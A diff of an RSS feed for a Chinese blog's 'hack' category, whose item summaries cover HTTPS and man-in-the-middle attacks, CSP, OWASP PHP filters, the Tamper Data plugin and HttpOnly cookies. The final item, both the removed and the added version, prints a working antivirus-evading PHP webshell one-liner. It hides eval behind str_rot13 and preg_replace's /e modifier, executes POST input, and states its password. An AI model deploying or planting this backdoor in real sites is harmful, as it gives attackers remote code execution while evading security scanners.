@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Hack on Funbox的技术记事本</title>
@@ -6,25 +6,18 @@
     <description>Recent content in Hack on Funbox的技术记事本</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh</language>
-    <lastBuildDate>Wed, 16 Aug 2017 03:15:35 +0000</lastBuildDate>
-    
-	<atom:link href="https://ifunbox.top/categories/hack/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <lastBuildDate>Wed, 16 Aug 2017 03:15:35 +0000</lastBuildDate><atom:link href="https://ifunbox.top/categories/hack/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HTTPS原理以及HTTPS中间人攻击</title>
-      <link>https://ifunbox.top/security-https-and-mitm/</link>
+      <link>https://ifunbox.top/security-https-and-MITM/</link>
       <pubDate>Wed, 16 Aug 2017 03:15:35 +0000</pubDate>
       
-      <guid>https://ifunbox.top/security-https-and-mitm/</guid>
+      <guid>https://ifunbox.top/security-https-and-MITM/</guid>
       <description>https简介 http(Hyper Text Transfer Protocol)超文本传输协议是一种用于分布式、协作式和超媒体信息系统的应用层协议,它是TCP/IP的上层协议,同时它也是万维网(万维网不等同于互联网,它只是基于互联网的一个服务)的数据通信的基础.
 http协议是客户端浏览器与其他程序或Web服务器之间交互的应用层通讯协议.但它也有一个致命的缺点:http协议是明文传输协议,在传输信息的过程中并没有进行任何加密,通信的双方也没有任何的认证,这是非常不安全的,如果在通信过程中被中间人进行劫持、监听、篡改,会造成个人隐私泄露等严重的安全问题.
 https就是用于解决这样的安全问题的,它的全称为Hypertext Transfer Protocol Secure,它在http的基础上添加了SSL(安全套接字层)层来保证传输数据的安全问题.
 https提供了端对端的加密,而且不仅对数据进行了加密,还对数据完整性提供了保护.不过在讲解https的加密方式之前,我们需要先了解一下加密算法.
- 对称加密 对称加密的基本思想是: 通信双方使用同一个密钥(或者是两个可以简单地互相推算的密钥)来对明文进行加密与解密.
-常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6.
-  对称加密看起来很美好,但是密钥要怎么发送过去呢?如果直接发送过去,被中间人截获了密钥岂不是白费工夫.&amp;lt;/li&amp;gt; * 非对称加密 非对称加密也叫公开密钥加密,它使用了两个密钥,一个为公钥,一个为私钥,当一个用作于加密的时候,另一个则用作解密. 这两个密钥就算被其他人知道了其中一个也不能凭借它计算出另一个密钥,所以可以公开其中一个密钥(也就是公钥),不公开的密钥为私钥.   如果服务器想发送消息给客户端,只需要用客户端的公钥加密,然后客户端用它自己的私钥进行解密. 常见的非对称加密算法有RSA、DSA、ECDSA、 DH、ECDHE. 我们以DH算法为例,了解一下非对称加密的魅力.  
-对称加密与非对称加密结合使用的方法虽然能够保证了通信过程的安全,但也引发了如下问题: * 客户端要如何获取到服务器的公钥? * 如果公钥在发送过程被中间人拦截,然后中间人发送自己的公钥给客户端,客户端该如何确认? 解决方法依是通过一个权威的CA(Certificate Authority)证书中心, * * * ## CA (Certificate Authority证书颁发机构) 它来负责颁发证书（声明这个公钥确实是服务端的）,这个证书包含了如下等内容: * 证书的发布机构. * 证书的有效期 * 公钥 * 证书所有人 * 数字签名 数字签名是用来验证数据完整性的，首先将公钥与个人信息用一个Hash算法生成一个消息摘要，Hash算法是不可逆的，且只要内容发生变化，那生成的消息摘要将会截然不同。然后CA再用它的私钥对消息摘要加密，最终形成数字签名。还把原始信息和数据签名合并，形成一个全新的东西，叫做“数字证书”  当客户端接收到证书时,只需要用同样的Hash算法再次生成一个消息摘要,然后用CA的公钥对证书进行解密,之后再对比两个消息摘要就能知道数据有没有被篡改过了.  那么CA的公钥又要从哪里来呢？这似乎陷入了一个鸡生蛋,蛋生鸡的悖论，其实CA也有证书来证明自己，而且CA证书的信用体系就像一棵树的结构，上层节点是信用高的CA同时它也会对底层的CA做信用背书，操作系统／浏览器中会内置一些顶层的CA的证书，相当于你自动信任了他们。这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根CA，如果到达终点在自己的信任列表内未发现可信任的CA则认为此证书不可信。  验证证书链的时候，用上一级的公钥对证书里的签名进行解密，还原对应的摘要值，再使用证书信息计算证书的摘要值，最后通过对比两个摘要值是否相等，如果不相等则认为该证书不可信，如果相等则认为该级证书链正确，以此类推对整个证书链进行校验，引用高性能网络中的证书链校验图。 * * * ## Https的交互过程   1.</description>
+ 对称加密 对称加密的基本思想是: 通信双方使用同一个密钥(或者是两个可以简单地互相推算的密钥)来对明文进行加密与解密.  常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6.  对称加密看起来很美好,但是密钥要怎么发送过去呢?如果直接发送过去,被中间人截获了密钥岂不是白费工夫.&amp;lt;/li&amp;gt; * 非对称加密 非对称加密也叫公开密钥加密,它使用了两个密钥,一个为公钥,一个为私钥,当一个用作于加密的时候,另一个则用作解密. 这两个密钥就算被其他人知道了其中一个也不能凭借它计算出另一个密钥,所以可以公开其中一个密钥(也就是公钥),不公开的密钥为私钥.   如果服务器想发送消息给客户端,只需要用客户端的公钥加密,然后客户端用它自己的私钥进行解密. 常见的非对称加密算法有RSA、DSA、ECDSA、 DH、ECDHE. 我们以DH算法为例,了解一下非对称加密的魅力.  对称加密与非对称加密结合使用的方法虽然能够保证了通信过程的安全,但也引发了如下问题: * 客户端要如何获取到服务器的公钥? * 如果公钥在发送过程被中间人拦截,然后中间人发送自己的公钥给客户端,客户端该如何确认? 解决方法依是通过一个权威的CA(Certificate Authority)证书中心, * * * ## CA (Certificate Authority证书颁发机构) 它来负责颁发证书（声明这个公钥确实是服务端的）,这个证书包含了如下等内容: * 证书的发布机构. * 证书的有效期 * 公钥 * 证书所有人 * 数字签名 数字签名是用来验证数据完整性的，首先将公钥与个人信息用一个Hash算法生成一个消息摘要，Hash算法是不可逆的，且只要内容发生变化，那生成的消息摘要将会截然不同。然后CA再用它的私钥对消息摘要加密，最终形成数字签名。还把原始信息和数据签名合并，形成一个全新的东西，叫做“数字证书”  当客户端接收到证书时,只需要用同样的Hash算法再次生成一个消息摘要,然后用CA的公钥对证书进行解密,之后再对比两个消息摘要就能知道数据有没有被篡改过了.  那么CA的公钥又要从哪里来呢？这似乎陷入了一个鸡生蛋,蛋生鸡的悖论，其实CA也有证书来证明自己，而且CA证书的信用体系就像一棵树的结构，上层节点是信用高的CA同时它也会对底层的CA做信用背书，操作系统／浏览器中会内置一些顶层的CA的证书，相当于你自动信任了他们。这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根CA，如果到达终点在自己的信任列表内未发现可信任的CA则认为此证书不可信。  验证证书链的时候，用上一级的公钥对证书里的签名进行解密，还原对应的摘要值，再使用证书信息计算证书的摘要值，最后通过对比两个摘要值是否相等，如果不相等则认为该证书不可信，如果相等则认为该级证书链正确，以此类推对整个证书链进行校验，引用高性能网络中的证书链校验图。 * * * ## Https的交互过程   1. 浏览器对服务器发送了一次请求，包含协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。 2.</description>
     </item>
     
     <item>
@@ -35,18 +28,13 @@ https提供了端对端的加密,而且不仅对数据进行了加密,还对数�
       <guid>https://ifunbox.top/content-security-policy/</guid>
       <description>简介 跨域脚本攻击 XSS 是最常见、危害最大的网页安全漏洞。
 为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？
-这就是&amp;#8221;网页安全政策&amp;#8221;（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。
+这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。
 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。
 CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。
 开启方式
-#通过 HTTP 头信息的Content-Security-Policy Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https: #通过网页的&amp;amp;lt;meta&amp;amp;gt;标签。 &amp;amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&amp;quot;&amp;amp;gt;  具体含义:
-* 脚本：只信任当前域名
-* &amp;lt;object&amp;gt;标签：不信任任何URL，即不加载任何资源
-* 样式表：只信任cdn.example.org和third-party.org
-* 框架（frame）：必须使用HTTPS协议加载
-* 其他资源：没有限制
-启用后，不符合 CSP 的外部资源就会被阻止加载，现代浏览器(Chrome/Firefox) Console控制台中将会报错。
-限制选项  资源加载限制  script-src：外部脚本 style-src：样式表 img-src：图像 media-src：媒体文件（音频和视频） font-src：字体文件 object-src：插件（比如 Flash） child-src：框架 frame-ancestors：嵌入的外部资源（比如&amp;lt;frame&amp;gt;、&amp;lt;iframe&amp;gt;、&amp;lt;embed&amp;gt;和&amp;lt;applet&amp;gt;） connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） worker-src：worker脚本 manifest-src：manifest 文件  default-src</description>
+#通过 HTTP 头信息的Content-Security-Policy Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https: #通过网页的&amp;amp;lt;meta&amp;amp;gt;标签。 &amp;amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&amp;quot;&amp;amp;gt; 具体含义:
+ 脚本：只信任当前域名 &amp;lt;object&amp;gt;标签：不信任任何URL，即不加载任何资源 样式表：只信任cdn.example.org和third-party.org 框架（frame）：必须使用HTTPS协议加载 其他资源：没有限制  启用后，不符合 CSP 的外部资源就会被阻止加载，现代浏览器(Chrome/Firefox) Console控制台中将会报错。
+ 限制选项  资源加载限制  script-src：外部脚本 style-src：样式表 img-src：图像 media-src：媒体文件（音频和视频） font-src：字体文件 object-src：插件（比如 Flash） child-src：框架 frame-ancestors：嵌入的外部资源（比如&amp;lt;frame&amp;gt;、&amp;lt;iframe&amp;gt;、&amp;lt;embed&amp;gt;和&amp;lt;applet&amp;gt;） connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） worker-src：worker脚本 manifest-src：manifest 文件   default-src</description>
     </item>
     
     <item>
@@ -55,16 +43,7 @@ CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没�
       <pubDate>Fri, 28 Mar 2014 08:14:37 +0000</pubDate>
       
       <guid>https://ifunbox.top/owasp_php_filters/</guid>
-      <description>最近在研究关于php安全的问题，无意中看到使用 PHP 构建的 Web 应用如何避免 XSS 攻击，很受启发，尤其是字符集编码、动态内容为JavaScript事件处理函数的参数、动态内容位于 JavaScript 代码段中时的xss攻击，建议大家都看看，今天要介绍的owasp php filters也是从这篇文章中看到的。
-首先先介绍下owasp，开放Web应用程序安全性项目(OWASP)501&amp;copy;(3)全球非营利慈善组织专注于改进的安全软件。进他们的项目主页，项目好多，关于php也有不少，不过有几个很好的安全项目还没有提供相关类库的下载，想杀人的冲动。。。。
-owasp php filters的主页是https://www.owasp.org/index.php/OWASP_PHP_Filters，里面有关于一些安全过滤函数的介绍，
-项目下载地址http://sourceforge.net/project/showfiles.php?group_id=64424&amp;amp;package_id=106757
-&amp;nbsp;
-核心文件是sanitize.php，index.php是提供给大家测试安全过滤函数用的，test.php过滤输出结果页。
-介绍几个常用的函数：
-sanitize_sql_string函数用来过滤sql输入参数，该函数addslashes了下，又去除了;，去除；主要是防止 x&amp;#8217;; DROP TABLE members; &amp;#8212; 这种攻击。
-sanitize_html_string函数用来过滤html的输出，相比htmlspecialchars函数，sanitize_html_string函数过滤了更多的特殊字符，但是感觉还是不是很给力，HTML Purifier才是首选，地址是http://htmlpurifier.org/。
-在学习的过程中，我也发现了一些很给力的php自带函数比如filter_var，该函数不仅提供邮箱、ip的验证，还提供了一些安全过滤功能。</description>
+      <description>最近在研究关于php安全的问题，无意中看到使用 PHP 构建的 Web 应用如何避免 XSS 攻击，很受启发，尤其是字符集编码、动态内容为JavaScript事件处理函数的参数、动态内容位于 JavaScript 代码段中时的xss攻击，建议大家都看看，今天要介绍的owasp php filters也是从这篇文章中看到的。首先先介绍下owasp，开放Web应用程序安全性项目(OWASP)501(c)(3)全球非营利慈善组织专注于改进的安全软件。进他们的项目主页，项目好多，关于php也有不少，不过有几个很好的安全项目还没有提供相关类库的下载，想杀人的冲动。。。。owasp php filters的主页是https://www.owasp.org/index.php/OWASP_PHP_Filters，里面有关于一些安全过滤函数的介绍，项目下载地址http://sourceforge.net/project/showfiles.php?group_id=64424&amp;amp;package_id=106757 核心文件是sanitize.php，index.php是提供给大家测试安全过滤函数用的，test.php过滤输出结果页。介绍几个常用的函数：sanitize_sql_string函数用来过滤sql输入参数，该函数addslashes了下，又去除了;，去除；主要是防止 x’; DROP TABLE members; — 这种攻击。sanitize_html_string函数用来过滤html的输出，相比htmlspecialchars函数，sanitize_html_string函数过滤了更多的特殊字符，但是感觉还是不是很给力，HTML Purifier才是首选，地址是http://htmlpurifier.</description>
     </item>
     
     <item>
@@ -73,16 +52,9 @@ sanitize_html_string函数用来过滤html的输出，相比htmlspecialchars函�
       <pubDate>Thu, 27 Mar 2014 03:37:11 +0000</pubDate>
       
       <guid>https://ifunbox.top/tamper_data_xss_sql_injection/</guid>
-      <description>一. 简介 作为 Firefox 的插件， Tamper Data 简单易用，功能强大，可以用来查看和修改 HTTP/HTTPS 的头部和 POST 参数；可以用来跟踪 HTTP 请求和响应并记时；可以对 WEB 站点进行某些安全测试，从而为调试 WEB 配置带来了极大的便利，是网站维护人员不可多得的实用工具；当然也可以用来篡改请求数据，达到xss攻击、mysql注入的目的。
-安装地址：https://addons.mozilla.org/en-us/firefox/addon/tamper-data/
-二. 使用 点击 Firefox 菜单栏上“工具”菜单项里面的“Tamper Data”，就会弹出 Tamper Data 的主窗口，如下图所示：
-
-&amp;nbsp;
-可以看出，其主窗口主要分成三部分，分别如图中的 1，2，3 所示。当我们打开 Tamper Data 后，我们浏览网页时发出的每一个 HTTP 请求及其对应的响应都会被 Tamper Data 记录下来，上面的区域显示了浏览器的各个通信情况。类似Firefox下著名的抓包扩展Httpfox，这里详细记录了：“网址”、“所耗时间”、“页面大小”、“请求方式”、“状态”、“Content Type”等信息。
-第 1 部分显示每一个 HTTP 请求及其对应的 HTTP 响应的概要信息，其中包括了大量有用的信息，比如页面元素大小，HTTP 请求的方法，HTTP 响应的状态值，等等。最 值得注意的是“Duration”和“Total Duration”这两个字段的值，他们显示出了打开每一个页面元素所花费的时间和打开该页面花费的总时间。根据这些时间值，就可以判断出打开我们页面的 速度如何，是哪些页面元素影响了整个页面打开的速度，从而为我们进一步优化页面提供宝贵的信息。当我们在第 1 部分选中某条概要信息后。
-第 2 部分会显示出对应的 HTTP 请求的头部信息。
-第 3 部分会显示出对应的 HTTP 响应的头部信息。
-如果我们比较喜欢查看图型化的统计信息，那么可以在 Tamper Data 主窗口的第 1 部分单击右键，在弹出的菜单上点击“Graph All”，如下图所示，那么这些每个页面元素及其打开它们所花费的时间，就会以图形的方式，直观地显示出来。具体的图形，就不提供了。</description>
+      <description>一. 简介 作为 Firefox 的插件， Tamper Data 简单易用，功能强大，可以用来查看和修改 HTTP/HTTPS 的头部和 POST 参数；可以用来跟踪 HTTP 请求和响应并记时；可以对 WEB 站点进行某些安全测试，从而为调试 WEB 配置带来了极大的便利，是网站维护人员不可多得的实用工具；当然也可以用来篡改请求数据，达到xss攻击、mysql注入的目的。安装地址：https://addons.mozilla.org/en-us/firefox/addon/tamper-data/二. 使用 点击 Firefox 菜单栏上“工具”菜单项里面的“Tamper Data”，就会弹出 Tamper Data 的主窗口，如下图所示：
+ 可以看出，其主窗口主要分成三部分，分别如图中的 1，2，3 所示。当我们打开 Tamper Data 后，我们浏览网页时发出的每一个 HTTP 请求及其对应的响应都会被 Tamper Data 记录下来，上面的区域显示了浏览器的各个通信情况。类似Firefox下著名的抓包扩展Httpfox，这里详细记录了：“网址”、“所耗时间”、“页面大小”、“请求方式”、“状态”、“Content Type”等信息。第 1 部分显示每一个 HTTP 请求及其对应的 HTTP 响应的概要信息，其中包括了大量有用的信息，比如页面元素大小，HTTP 请求的方法，HTTP 响应的状态值，等等。最 值得注意的是“Duration”和“Total Duration”这两个字段的值，他们显示出了打开每一个页面元素所花费的时间和打开该页面花费的总时间。根据这些时间值，就可以判断出打开我们页面的 速度如何，是哪些页面元素影响了整个页面打开的速度，从而为我们进一步优化页面提供宝贵的信息。当我们在第 1 部分选中某条概要信息后。第 2 部分会显示出对应的 HTTP 请求的头部信息。第 3 部分会显示出对应的 HTTP 响应的头部信息。如果我们比较喜欢查看图型化的统计信息，那么可以在 Tamper Data 主窗口的第 1 部分单击右键，在弹出的菜单上点击“Graph All”，如下图所示，那么这些每个页面元素及其打开它们所花费的时间，就会以图形的方式，直观地显示出来。具体的图形，就不提供了。和Httpfox等专业的抓包扩展相比，Tamper Data所展现的信息也仅仅算是合格，表现中规中矩。但是，术业有专攻，正如它的名字一样，它不同于Httpfox的“可远观而不可亵玩焉”，，Tamper Data的真正用途是窜改数据。点击“Start Temper”按钮，这时浏览器所发送的任何请求，都会被拦截下来。例如，我们尝试在贴吧发个帖子。当按下“发表”按钮的时候，它会弹出一个对话框：
+我们可以选择“Tamper”和“Submit”还有“Abort Request”。中间的按钮是让其通过，第三个按钮是终止请求，现在，我们点击第一个按钮“Tamper”。</description>
     </item>
     
     <item>
@@ -91,45 +63,16 @@ sanitize_html_string函数用来过滤html的输出，相比htmlspecialchars函�
       <pubDate>Sat, 26 Oct 2013 14:39:37 +0000</pubDate>
       
       <guid>https://ifunbox.top/what_is_httponly/</guid>
-      <description>1.什么是HttpOnly?
-
-如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击
-具体一点的介绍请google进行搜索
-
-
-2.javaEE的API是否支持?
-
-目前sun公司还没有公布相关的API，但PHP、C#均有实现。搞javaEE的兄弟们比较郁闷了，别急下文有变通实现
-
-3.HttpOnly的设置样例
-
-javaEE
-   Javaee代码      response.setHeader(&amp;#8220;Set-Cookie&amp;#8221;, &amp;#8220;cookiename=value;    Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&amp;#8221;);    
-   Javaee代码     response.setHeader(&amp;#8220;Set-Cookie&amp;#8221;, &amp;#8220;cookiename=value;    Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&amp;#8221;);    
-
-具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取
-
-   Java代码      Cookie cookies[]=request.getCookies();    
-   Java代码     Cookie cookies[]=request.</description>
+      <description>1.什么是HttpOnly?如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击具体一点的介绍请google进行搜索2.javaEE的API是否支持?目前sun公司还没有公布相关的API，但PHP、C#均有实现。搞javaEE的兄弟们比较郁闷了，别急下文有变通实现3.HttpOnly的设置样例javaEE具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取C#VB.NET但是在 .NET 1.</description>
     </item>
     
     <item>
       <title>避开eval关键字，打造免杀一句话木马</title>
-      <link>https://ifunbox.top/php_anti-antivirus-/</link>
+      <link>https://ifunbox.top/php_anti-antivirus%20/</link>
       <pubDate>Tue, 08 Oct 2013 01:33:42 +0000</pubDate>
       
-      <guid>https://ifunbox.top/php_anti-antivirus-/</guid>
-      <description>首先我想到的是将eval从字符串类型赋给一个变量。
-如：$func = ‘phpinfo’;
-$func();
-这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。
-还记得《20 Ways to Fuzzing PHP Source Code》里提到的preg_replace代码执行漏洞吗？
-没错，利用preg_replace的模式修饰符e（PREG_REPLACE_EVAL）就可以将替换后的字符串作为php代码评估运行(eval函数方式)。
-既然是将字符串作为php代码评估运行，哪么完全可以替换或者转码一下eval，这样就可以避开关键字了。
-我的一句话木马如下：
- ($b4dboy = $_POST[&amp;#8216;b4dboy&amp;#8217;]) &amp;amp;&amp;amp; @preg_replace(‘/ad/e’,&amp;#8217;@’.str_rot13(‘riny’).’($b4dboy)’, ’add’);  使用上跟原来的一句话没有区别，可用常用的客户端连接密码b4dboy。
-str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果。
-转载请注明版权，谢谢！http://hi.baidu.com/b4dboy</description>
+      <guid>https://ifunbox.top/php_anti-antivirus%20/</guid>
+      <description>首先我想到的是将eval从字符串类型赋给一个变量。如：$func = ‘phpinfo’;$func();这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。还记得《20 Ways to Fuzzing PHP Source Code》里提到的preg_replace代码执行漏洞吗？没错，利用preg_replace的模式修饰符e（PREG_REPLACE_EVAL）就可以将替换后的字符串作为php代码评估运行(eval函数方式)。既然是将字符串作为php代码评估运行，哪么完全可以替换或者转码一下eval，这样就可以避开关键字了。我的一句话木马如下： ($b4dboy = $_POST[‘b4dboy’]) &amp;amp;&amp;amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ’add’);  使用上跟原来的一句话没有区别，可用常用的客户端连接密码b4dboy。str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果。转载请注明版权，谢谢！http://hi.</description>
     </item>
     
   </channel>
